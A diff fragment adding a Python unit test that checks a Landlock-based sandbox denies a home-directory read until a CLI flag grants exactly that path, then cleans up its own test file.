+    through the CLI state. This is the self-service recovery loop:
+    --audit names the denied path, the flag grants exactly that path.
+    """
+
+    def setUp(self):
+        if not check_net_available():
+            self.skipTest("User namespaces not available")
+        if not check_landlock_available():
+            self.skipTest("Landlock not available")
+
+    def test_cli_readable_path_grants_denied_read(self):
+        from core.sandbox import state
+        from core.sandbox.cli import set_cli_readable_paths
+
+        extra_dir = Path.home() / ".raptor_cli_rp_test"
+        extra_dir.mkdir(exist_ok=True)
+        secret = extra_dir / "cfg.txt"
+        secret.write_text("GRANTED\n")
+        try:
+            with TemporaryDirectory() as out:
+                denied = sandbox_run(
+                    ["cat", str(secret)], output=out,
+                    restrict_reads=True,
+                    capture_output=True, text=True, timeout=30,
+                )
+                self.assertNotEqual(
+                    denied.returncode, 0,
+                    "home read must be denied without the extension",
+                )
+                set_cli_readable_paths([str(extra_dir)])
+                granted = sandbox_run(
+                    ["cat", str(secret)], output=out,
+                    restrict_reads=True,
+                    capture_output=True, text=True, timeout=30,
+                )
+                self.assertEqual(
+                    granted.returncode, 0,
+                    f"extension must grant the read; stderr: {granted.stderr}",
+                )
+                self.assertIn("GRANTED", granted.stdout)
+        finally:
+            state._cli_sandbox_readable_paths = None
+            secret.unlink(missing_ok=True)
+            extra_dir.rmdir()
